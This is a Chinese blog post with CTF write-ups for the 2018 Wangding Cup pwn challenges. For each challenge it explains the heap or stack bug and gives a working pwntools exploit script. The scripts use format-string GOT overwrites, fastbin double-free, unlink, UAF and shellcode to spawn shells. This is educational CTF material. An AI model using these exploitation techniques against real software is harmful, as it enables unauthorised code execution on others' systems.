<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>网鼎杯2018 Pwn - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。"><meta property="og:type" content="blog"><meta property="og:title" content="网鼎杯2018 Pwn"><meta property="og:url" content="https://signormercurio.me/post/WDB2018Pwn/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2020-05-04T03:17:45.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="fsb"><meta property="article:tag" content="uaf"><meta property="article:tag" content="double-free"><meta property="article:tag" content="fastbin-attack"><meta property="article:tag" content="unlink"><meta property="article:tag" content="SSP"><meta property="article:tag" content="ret2shellcode"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/WDB2018Pwn/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2020-05-04T03:17:45.000Z","author":{"@type":"Person","name":"Mercury"},"description":"准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。"}</script><link rel="canonical" href="https://signormercurio.me/post/WDB2018Pwn/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-05-04T03:17:45.000Z" title="2020-05-04T03:17:45.000Z">2020-05-04</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Pwn/">Pwn</a></span><span class="level-item">14 minutes read (About 2125 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">网鼎杯2018 Pwn</h1><div class="content"><p>准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。</p>
<a id="more"></a>

<h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>题目有三次猜flag机会，每次都会<code>fork</code>出子进程，并且开启了canary。尝试运行可以发现读取的flag放在了栈上，因此我们需要栈地址来泄露flag，而泄露栈地址需要先泄露libc。</p>
<p>首先我们可以覆盖<code>argv[0]</code>为<code>puts@got</code>，借助<code>__stack_chk_fail</code>函数的报错来泄露libc。输入任意字符串进入<code>strncmp</code>，在此处下断点，通过<code>p &amp;__libc_argv[0]</code>可得到<code>argv[0]</code>地址，然后查看栈得到我们输入的字符串所在地址，两个地址的距离就是我们需要栈溢出的长度，这个长度是0x128。然后放上<code>puts@got</code>就能泄露libc，接下来就能得到<code>_environ</code>地址。</p>
<p>计算<code>_environ</code>地址到<code>flag</code>地址的距离就能得到flag真实地址，这个距离是0x168，我们可以在第三次地址泄露中读到flag。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssp</span>(<span class="params">payload</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + payload)</span><br><span class="line">	ru(<span class="string">&#x27;detected ***: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">ssp(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">puts = uu64(r(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;puts&#x27;</span>,puts,libc)</span><br><span class="line">env = base + libc.sym[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">ssp(p64(env))</span><br><span class="line">flag = uu64(r(<span class="number">6</span>)) - <span class="number">0x168</span></span><br><span class="line"></span><br><span class="line">ssp(p64(flag))</span><br></pre></td></tr></table></figure>

<h2 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h2><p>本题存在double free但没有show功能，申请堆块时只能申请0x68大小的，这个大小我们喜闻乐见，因为申请到的实际堆块大小为0x70，而我们一般伪造chunk size都是借助0x7f来构造。</p>
<p>那么我们可以借助double free申请堆块到全局数组的位置，伪造的堆块可以在<code>0x602060-0x23</code>处找到，然后就可以在全局数组上方再伪造一个0x100大小的chunk，从而绕过0x68的限制申请到small chunk。这里我们将<code>ptr[0]</code>和<code>ptr[2]</code>写成<code>0x602060</code>，将<code>ptr[4]</code>写成<code>0x602150</code>，我们稍后会看到原因。</p>
<p>需要注意的是<code>free</code>时会检查后两块的chunk size是否合法，因此我们同样需要伪造：下一个chunk的起始地址为<code>0x602050+0x100 = 0x602150</code>，可以从这里开始伪造2个0x21的chunk。这里就是通过<code>ptr[4]</code>来伪造的。</p>
<p>然后我们释放0x100的伪造chunk，这样在释放时即进入unsorted bin，覆盖<code>ptr[0]</code>和<code>ptr[1]</code>为<code>main_arena+88</code>。释放需要用到一个指向<code>0x602060</code>的指针，也就是我们之前在<code>ptr[0]</code>写入的指针。随后进行partial overwrite，覆盖掉<code>ptr[0]</code>也就是<code>main_arena+88</code>的最低1字节为<code>\x00</code>，这时<code>ptr[0]</code>存放的就是<code>__malloc_hook-0x10</code>的地址，这一步是编辑<code>ptr[2]</code>处指针指向的内容实现的。</p>
<p>此时再编辑<code>ptr[0]</code>指向的内容即可写<code>__malloc_hook</code>为后门函数。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">fake = <span class="number">0x602060</span></span><br><span class="line">fake_next = <span class="number">0x602150</span></span><br><span class="line">add(<span class="number">2</span>,p64(fake<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x101</span>,fake,<span class="number">0</span>,fake,<span class="number">0</span>,fake_next,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>,flat(<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x100</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># \x00, malloc_hook-0x10</span></span><br><span class="line">system = <span class="number">0x4008e3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(system))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,_add)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>本题和上题有点类似，只能分配0x20的堆块，漏洞点相同，且多了show功能。</p>
<p>首先考虑泄露libc，我们采用传统的unsorted bin泄露大法，这就需要我们伪造small chunk。为了伪造这个chunk，首先要泄露堆地址，那么连续释放2个fast chunk，后一个的fd就会指向前一个chunk的地址，从而可以泄露堆地址。唯一需要注意的是show在输出时用的<code>puts</code>遇到<code>\x00</code>会截断，所以要注意释放顺序使得泄露出的地址中不存在<code>\x00</code>字节。</p>
<p>获得堆地址之后，在chunk0内伪造chunk头造成堆块重叠，然后申请两次就可以申请到一个<code>heap+0x20</code>处的chunk，通过写这个chunk我们可以写chunk1的头部，使得其大小变成0xa1。随后释放即可泄露libc，但这里释放时会检查后两个chunk的size，因此我们还需要绕过检查。</p>
<p>绕过的方法是，不断申请chunk直到0xa1这个chunk的末尾，此时申请到的是chunk4。写入<code>0,0x31</code>伪造一个chunk头；再申请一个chunk5，写入<code>0x30,0x30</code>伪造chunk头，使得chunk4看起来是空闲的。这两步先做好后再释放chunk1才能通过检查。</p>
<p>这里让chunk4空闲的目的就是为了触发<code>unlink</code>造成任意地址写，那么显然我们还需要再chunk4的内容里添加伪造的<code>fd</code>和<code>bk</code>，即<code>0x602080-0x18</code>和<code>0x602080-0x10</code>，这里<code>0x602080</code>是<code>ptr[4]</code>。<code>unlink</code>之后，我们成功令<code>ptr[4]</code>指向<code>ptr[1]</code>。现在编辑chunk4即可修改<code>ptr[1]</code>为<code>free_hook</code>，然后编辑chunk1即可覆盖<code>free_hook</code>为<code>one_gadget</code>（<code>system</code>同理）。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">fd = <span class="number">0x602080</span><span class="number">-0x18</span></span><br><span class="line">bk = <span class="number">0x602080</span><span class="number">-0x10</span></span><br><span class="line">add(<span class="number">4</span>,flat(<span class="number">0</span>,<span class="number">0x31</span>,fd,bk))</span><br><span class="line">add(<span class="number">5</span>,flat(<span class="number">0x30</span>,<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = uu64(r(<span class="number">4</span>)) - <span class="number">0x30</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,flat(heap+<span class="number">0x20</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">6</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">7</span>,flat(<span class="number">0</span>,<span class="number">0xa1</span>)) <span class="comment"># above 1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">base = uu64(r(<span class="number">6</span>))<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(free_hook))</span><br><span class="line">edit(<span class="number">1</span>,p64(base+<span class="number">0x4526a</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="easyfmt"><a href="#easyfmt" class="headerlink" title="easyfmt"></a>easyfmt</h2><p>常规的32位格式化字符串题，自动化测得偏移为6，然后泄露libc，覆盖<code>printf@got</code>为<code>system</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	sl(payload)</span><br><span class="line">	info = r()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line"></span><br><span class="line">sl(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">&#x27;%6$s&#x27;</span>)</span><br><span class="line">r(<span class="number">4</span>)</span><br><span class="line">printf = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">sl(fmtstr_payload(auto.offset, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]:system&#125;))</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="fgo"><a href="#fgo" class="headerlink" title="fgo"></a>fgo</h2><p>入门级堆题，直接uaf即可。解法可以参考<code>hitcontraining_hacknote</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(elf.sym[<span class="string">&#x27;secret&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="soEasy"><a href="#soEasy" class="headerlink" title="soEasy"></a>soEasy</h2><p>存在栈溢出，给出了栈地址，checksec发现NX关闭，因此直接写好shellcode然后返回到shellcode地址即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">0x4c</span>,<span class="string">&#x27;a&#x27;</span>) + p32(buf)</span><br><span class="line">sla(<span class="string">&#x27;?&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<h2 id="pesp"><a href="#pesp" class="headerlink" title="pesp"></a>pesp</h2><p>编辑时新的size并没有作检查，导致可以堆溢出。利用堆溢出修改空闲fast chunk的<code>fd</code>，手动造成uaf，借助假的<code>0x7f</code>伪造chunk分配到<code>itemlist</code>上方从而修改<code>itemlist</code>中的内容指针达到任意地址写，泄露libc后覆盖<code>atoi</code>为<code>system</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake = <span class="number">0x6020ad</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>,<span class="number">0</span>,<span class="number">0x71</span>,fake))</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>, flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>, <span class="number">0x100</span>, elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;atoi&#x27;</span>,atoi,libc)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="semifinal-pwn1"><a href="#semifinal-pwn1" class="headerlink" title="semifinal_pwn1"></a>semifinal_pwn1</h2><p>本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块0x130的chunk，释放后进入unsorted bin。随后就可以利用uaf泄露libc并借助<code>update</code>功能覆盖got表。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">size,name</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,size)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,name)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;desc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_free</span>(<span class="params">name,choice</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,name)</span><br><span class="line">	sla(<span class="string">&#x27;(a/d)&#x27;</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_profile</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;desc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">reg(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">reg(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">login(<span class="string">&#x27;b&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">add_free(<span class="string">&#x27;b&#x27;</span>*<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_free(<span class="string">&#x27;b&#x27;</span>*<span class="number">6</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">view_profile()</span><br><span class="line">ru(<span class="string">&#x27;Age:&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">puts = base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">logout()</span><br><span class="line">reg(<span class="number">0x20</span>, p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">login(p64(puts))</span><br><span class="line">edit(p64(base+<span class="number">0x4526a</span>)[:<span class="number">-2</span>])</span><br></pre></td></tr></table></figure>


<h2 id="semifinal-pwn2"><a href="#semifinal-pwn2" class="headerlink" title="semifinal_pwn2"></a>semifinal_pwn2</h2><p>这题比较有意思，程序是一个brainfuck解释器，规则是：</p>
<ul>
<li><code>&lt;</code>: <code>p--</code></li>
<li><code>&gt;</code>: <code>p++</code></li>
<li><code>.</code>: <code>putc(*p)</code></li>
<li><code>,</code>: <code>read(0,p,1)</code></li>
<li><code>+</code>: <code>*p++</code></li>
<li><code>-</code>: <code>*p--</code></li>
</ul>
<p>换句话说已经可以构造任意地址读写了，那么首先利用上述规则泄露<code>stdin</code>来泄露libc，然后用one_gadget覆盖got表。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stdin = <span class="number">0x602090</span></span><br><span class="line">star = <span class="number">0x6020c0</span></span><br><span class="line">exit = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;&#x27;</span>*(star-stdin) + <span class="string">&#x27;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;&lt;&#x27;</span>*(stdin+<span class="number">6</span>-exit) + <span class="string">&#x27;,&gt;,&gt;,&gt;,&gt;,&gt;,&#x27;</span></span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>,payload)</span><br><span class="line">stdin = uu64(r(<span class="number">6</span>))</span><br><span class="line">base = stdin - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">one = p64(base + <span class="number">0xf1147</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	s(one[i])</span><br></pre></td></tr></table></figure>

<h2 id="semifinal-pwn3"><a href="#semifinal-pwn3" class="headerlink" title="semifinal_pwn3"></a>semifinal_pwn3</h2><p>本题当输入选项为<code>1337</code>时会调用一个奇怪的函数，但实际上由于uaf漏洞的存在这个函数并没有什么用。还有一个比较少见的<code>clean</code>功能用于清除所有指针，这里是不存在uaf的。</p>
<p>我们可以直接unsorted bin泄露libc（这里是通过<code>clean</code>功能清楚指针，重新申请到释放的small chunk后泄露<code>bk</code>），然后double free写<code>malloc_hook</code>，最后故意double free触发<code>malloc_print_err</code>，调用<code>malloc_hook</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice :&#x27;</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">clean()</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base = uu64(r(<span class="number">6</span>))<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one = base + <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(one))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># malloc_print_err</span></span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>网鼎杯2018 Pwn</p><p><a 